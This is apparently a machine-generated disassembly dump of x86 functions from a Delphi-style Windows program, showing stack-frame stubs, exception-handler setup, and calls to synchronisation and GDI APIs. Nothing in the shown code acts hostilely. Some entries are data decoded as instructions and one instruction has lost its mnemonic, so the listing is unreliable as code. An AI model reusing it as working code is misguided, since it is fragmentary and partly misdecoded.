pop ecx
pop ebp
retn
sub_419994
jmp sub_4038c0
sub_4199b1
jmp sub_4038c0
sub_4199b8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4199f4
retn
sub_419a77
jmp sub_4038c0
sub_419a7e
mov eax [ ebp - 0x8 ]
call sub_41c5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419aa3
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_419a9c
jmp sub_4038c0
sub_419aa3
mov esp ebp
pop ebp
retn
sub_419af3
jmp sub_4038c0
sub_419afa
pop esi
pop ecx
pop ebp
retn
sub_419b4d
jmp sub_4038c0
sub_419b54
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419b5c
retn
sub_419bd7
jmp sub_4038c0
sub_419bde
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419c7b
jmp sub_4038c0
sub_419c82
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c9f
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_419c98
jmp sub_4038c0
sub_419c9f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419ca4
retn
sub_419d1e
jmp sub_4038c0
sub_419d25
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419d2c
mov eax edx
mov edx ecx
call sub_4080b0
retn
sub_419d38
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_419d50
sub_419dc8
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_419e38
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_419e54
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a048
mov eax [ eax + 0x18 ]
retn
sub_41a04c
mov eax [ eax + 0x14 ]
retn
sub_41a0e8
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41a2f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40271c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41a330
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41a348
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41a35c
mov edx sub_41a348
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41a3a4
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_4080b0
retn
mov eax edx
mov edx ecx
call sub_408078
retn
sub_41a440
retn
sub_41a738
jmp sub_4038c0
sub_41a73f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41a7a0
jmp sub_4038c0
sub_41a7a7
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a7ec
mov eax [ eax + 0x4 ]
call sub_408790
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41a7fc
mov eax [ eax + 0x4 ]
call sub_4087bc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41a838
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41a9e1
jmp sub_4038c0
sub_41aa40
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41aad0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ab20
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41ad0b
jmp sub_4038c0
sub_41ad12
mov esp ebp
pop ebp
retn
sub_41adbc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
retn
sub_41ae44
mov [ eax + 0x18 ] edx
retn
sub_41afc0
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414ad4
retn
sub_41b047
jmp sub_4038c0
sub_41b04e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b0fa
jmp sub_4038c0
sub_41b101
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b2a5
jmp sub_4038c0
sub_41b2f7
jmp sub_4038c0
sub_41b316
jmp sub_4038c0
sub_41b31d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b33c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41b335
jmp sub_4038c0
sub_41b33c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b3df
jmp sub_4038c0
sub_41b467
jmp sub_4038c0
sub_41b474
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
pop ebx
retn
sub_41b48c
mov eax [ rw-data ]
call sub_41b474
retn
sub_41b4c4
push ebx
call sub_414938
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41b48c
sub_41b631
jmp sub_4038c0
sub_41b638
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f40
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41b758
jmp sub_4038c0
sub_41b75f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41b856
jmp sub_4038c0
sub_41b873
jmp sub_4038c0
sub_41b87a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b978
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a3c0
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41ba3c
push ebx
mov ebx eax
mov eax ebx
call sub_41d3f0
cmp al 0x9
sete al
pop ebx
retn
sub_41ba9b
jmp sub_4038c0
sub_41baa2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41bb48
jmp sub_4038c0
sub_41bb4f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bdce
jmp sub_40360c
sub_41bdfa
jmp sub_40360c
sub_41be9c
jmp sub_40360c
sub_41bf3f
jmp sub_40360c
sub_41c117
jmp sub_40360c
sub_41c159
jmp sub_4038c0
sub_41c189
jmp sub_4038c0
sub_41c190
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c1ff
jmp sub_4038c0
sub_41c2d6
jmp sub_4038c0
sub_41c2dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c5b0
mov dl 0x1
call sub_41b518
retn
sub_41c6f1
jmp sub_4038c0
sub_41c6f8
pop ebx
mov esp ebp
pop ebp
retn
sub_41c700
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41d500
mov eax [ rw-data ]
call sub_41b474
pop ebp
retn
sub_41c87a
jmp sub_403738
sub_41c8a1
jmp sub_403738
sub_41c8a6
add [ eax ] eax
add [ eax ] al
dec esp
jb r-xdata
iretd
add [ edx - 0x76ffbe38 ] dh
retn
sub_41c8ec
jmp sub_4038c0
sub_41c8f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c9d3
jmp sub_4038c0
sub_41c9da
mov esp ebp
pop ebp
retn
sub_41ca92
jmp sub_4038c0
sub_41ca99
pop ecx
pop ecx
pop ebp
retn
sub_41cd9b
jmp sub_4038c0
sub_41cda2
pop ebx
mov esp ebp
pop ebp
retn
sub_41d047
jmp sub_4038c0
sub_41d04e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40316c
retn
sub_41d067
jmp sub_4038c0
sub_41d08b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_40360c
sub_41d0c2
jmp sub_40360c
sub_41d101
jmp sub_4038c0
sub_41d108
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d12a
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f64
retn
sub_41d123
jmp sub_4038c0
sub_41d12a
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d1b1
jmp sub_40360c
sub_41d1de
jmp sub_4038c0
sub_41d1e5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d1f0
push ecx
mov edx esp
mov ecx 0x4
call sub_41b9b4
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41b474
sub_41d2fd
jmp sub_4038c0
sub_41d304
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d3e3
jmp sub_4038c0
sub_41d3ea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d440
jmp sub_4038c0
sub_41d447
pop ebx
pop ecx
pop ebp
retn
sub_41d68f
jmp sub_4038c0
sub_41d696
pop ecx
pop ecx
pop ebp
retn
sub_41d6d9
jmp sub_4038c0
sub_41d6e0
pop ebx
pop ecx
pop ebp
retn
sub_41d77c
jmp sub_4038c0
sub_41d783
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d831
jmp sub_4038c0
sub_41d838
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d844
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41da9f
jmp sub_4038c0
sub_41daa6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dacb
mov eax [ ebp - 0x8 ]
call sub_40316c
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_41dac4
jmp sub_4038c0
sub_41dacb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41daf0
lea eax [ ebp - 0x1c ]
call sub_4058d0
lea eax [ ebp - 0x18 ]
call sub_403f40
retn
sub_41dae9
jmp sub_4038c0
sub_41daf0
pop ebx
mov esp ebp
pop ebp
retn
sub_41dd02
jmp sub_4038c0
sub_41dd09
pop ebx
mov esp ebp
pop ebp
retn
sub_41dd5c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41a624
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41dd74
test dl dl
je r-xdata
mov dl 0x8
call sub_41def8
retn
mov dl 0x9
call sub_41def8
retn
sub_41ddfc
mov dl 0x1
call sub_41def8
retn
sub_41de04
xor edx edx
call sub_41def8
retn
sub_41dee9
jmp sub_4038c0
sub_41def0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41df0c
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40ce50
sub_41df40
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41df58
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41df64
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41df58
sub_41df80
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_41df8c
push rw-data
call InterlockedIncrement
retn
sub_41df98
push rw-data
call InterlockedDecrement
retn
sub_41e0ae
jmp sub_40360c
sub_41e0dd
jmp sub_4038c0
sub_41e113
jmp sub_4038c0
sub_41e11a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e139
push rw-data
call LeaveCriticalSection
retn
sub_41e132
jmp sub_4038c0
sub_41e139
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e185
jmp sub_40360c
sub_41e296
jmp sub_4038c0
sub_41e29d
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41e324
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_41e604
sub_41e39e
jmp sub_4038c0
sub_41e3a5
pop ebx
mov esp ebp
pop ebp
retn
sub_41e3c4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41e3d8
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_41e3c4
call sub_41e558
sub_41e4fd
jmp sub_4038c0
sub_41e504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e523
push rw-data
call LeaveCriticalSection
retn
sub_41e51c
jmp sub_4038c0
sub_41e523
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_41e53a
jmp sub_4038c0
sub_41e580
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_41e604
call sub_41e598
jmp r-xdata
sub_41e5e5
jmp sub_40360c
sub_41e62c
mov [ eax + 0xd ] 0x1
retn
sub_41e79c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41e978
sub_41e7fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c500
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41e810
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c500
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41e824
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41dd88
retn
sub_41e830
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41dd88
retn
sub_41ead8
xor eax eax
retn
sub_41eadc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41eae4
xor eax eax
retn
sub_41eae8
retn
sub_41eaec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f94
pop esi
pop ebx
retn
sub_41eb00
mov eax [ eax + 0x4 ]
retn
sub_41eb04
retn
sub_41eb08
xor eax eax
retn
sub_41eb0c
retn
sub_41eb10
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41eb1c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41eb28
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41eb34
retn
sub_41eb38
xchg edx eax
call sub_41c1a4
retn
sub_41eb40
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41ebc8
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403368
pop esi
retn
sub_41ebdc
retn
sub_41ecbc
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f94
pop esi
pop ebx
retn
sub_41ecfc
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41ee48
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4033b4
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41ee60
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41eee8
retn
sub_41ef30
retn
sub_41ef68
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41ef80
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41f1a4
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403368
pop esi
pop ebx
retn
sub_41efc8
mov al 0x1
retn
sub_41efcc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41efd4
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41f07c
xor eax eax
retn
sub_41f080
retn
sub_41f0ac
retn
sub_41f144
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41f158
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_417d38
retn
sub_41f29f
jmp sub_40360c
sub_41f2a4
mov ebx 0x1
call sub_403974
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41f307
jmp sub_40360c
sub_41f30c
mov ebx 0x80030103
call sub_403974
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41f38a
jmp sub_40360c
sub_41f38f
mov ebx 0x80030009
call sub_403974
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41f3ed
jmp sub_40360c
sub_41f3f2
mov ebx 0x8000ffff
call sub_403974
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41f5bd
jmp sub_4038c0
sub_41f5ce
jmp sub_40360c
sub_41f5d3
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5fc
lea eax [ ebp + 0xc ]
call sub_4058d0
retn
sub_41f5f5
jmp sub_4038c0
sub_41f5fc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41f608
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41f614
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41f620
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41f62c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41f69b
jmp sub_40360c
sub_41f6a0
mov esi 0x8000ffff
call sub_403974
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41f6b4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41f721
jmp sub_4038c0
sub_41f728
mov eax [ rw-data ]
call sub_40316c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41f738
call sub_417684
retn
sub_41f800
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41f9a4
jmp sub_4038c0
sub_41f9ab
pop ebp
retn
sub_41fa39
jmp sub_4038c0
sub_41fa40
pop ebp
retn
sub_41fd61
jmp sub_4038c0
sub_41fd68
pop ebp
retn
sub_41fd6c
sub [ rw-data ] 0x1
retn
sub_420751
add eax 0xffffffd8
jmp sub_424acc
sub_420759
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_420c7c
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_420cf0
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_420d64
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_420d70
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_420e50
jmp sub_4038c0
sub_420e57
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420ee7
jmp sub_4038c0
sub_420f79
jmp sub_4038c0
sub_420f80
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420fe4
jmp sub_4038c0
sub_420feb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_421053
jmp sub_4038c0
sub_42105a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4210fd
jmp sub_4038c0
sub_421104
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42155c
push 0x33
mov ecx rw-data
call sub_417944
retn
sub_42156c
push 0x33
mov ecx rw-data
call sub_417904
retn
sub_42157c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4215a0
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_421774
push 0x11
mov ecx rw-data
call sub_417904
retn
sub_4218b4
push ebx
mov ebx eax
mov eax ebx
call sub_42157c
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42196e
jmp sub_4038c0
sub_421975
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215a0
retn
sub_42198b
jmp sub_4038c0
sub_4219a4
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_421a01
jmp sub_4038c0
sub_421a08
pop ebx
pop ecx
pop ebp
retn
sub_421b81
jmp sub_4038c0
sub_421ba9
jmp sub_4038c0
sub_421bb0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_421c1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041a4
pop esi
pop ebx
retn
sub_421c90
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_421bec
push eax
call sub_4063e4
neg eax
pop ebx
retn
sub_421ccc
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_421d04
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_421d34
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_421e52
jmp sub_4038c0
sub_421e59
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215a0
retn
sub_421e6f
jmp sub_4038c0
sub_421ee5
jmp sub_4038c0
sub_421eec
pop ebx
pop ecx
pop ebp
retn
sub_421ef0
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_421fa6
jmp sub_4038c0
sub_421fd8
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403368
sub_421fec
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_42212b
jmp sub_4038c0
sub_422132
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4215a0
retn
sub_422148
jmp sub_4038c0
sub_4221c1
jmp sub_4038c0
sub_4221c8
pop ebx
pop ecx
pop ebp
retn
sub_4222f9
jmp sub_4038c0
sub_42230c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_422644
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_4228b4
jmp sub_4038c0
sub_4228bb
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4228c4
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4228fc
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_422908
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_422a6c
retn
sub_422b35
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_422b4c
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_422c38
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_422c58
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_422c78
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_422c98
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
pop ebx
retn
sub_422cb0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
pop ebx
retn
sub_422cd4
mov eax [ rw-data ]
call sub_422cb0
retn
sub_422d36
jmp sub_4038c0
sub_422d3d
pop ecx
pop ebp
retn
sub_422ddc
jmp sub_4038c0
sub_422de3
pop ebx
mov esp ebp
pop ebp
retn
sub_422eb5
jmp sub_4038c0
sub_422f46
jmp sub_4038c0
sub_422f4d
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422f78
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_42305f
jmp sub_4038c0
sub_42320c
jmp sub_4038c0
sub_423213
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_423425
jmp sub_4038c0
sub_42342c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_4234c6
jmp sub_4038c0
sub_4236a2
jmp sub_4038c0
sub_42375c
jmp sub_4038c0
sub_423763
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423783
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42377c
jmp sub_4038c0
sub_423783
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423911
jmp sub_4038c0
sub_423adc
jmp sub_4038c0
sub_423ae3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b06
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026fc
retn
sub_423aff
jmp sub_4038c0
sub_423b06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b26
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
sub_423b1f
jmp sub_4038c0
sub_423b26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_423b30
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_423c90
push 0x0
call sub_423c2c
retn
sub_423d35
jmp sub_4038c0
sub_423d3c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_423d48
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_423c98
pop ebx
pop ebp
retn 0x4
sub_423d5c
retn
sub_423d60
test eax eax
jne r-xdata
retn
call sub_423d5c
sub_423f33
jmp sub_4038c0
sub_423f5a
jmp sub_4038c0
sub_423f61
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423fa0
push ebx
mov [ eax + 0x20 ] 0x1
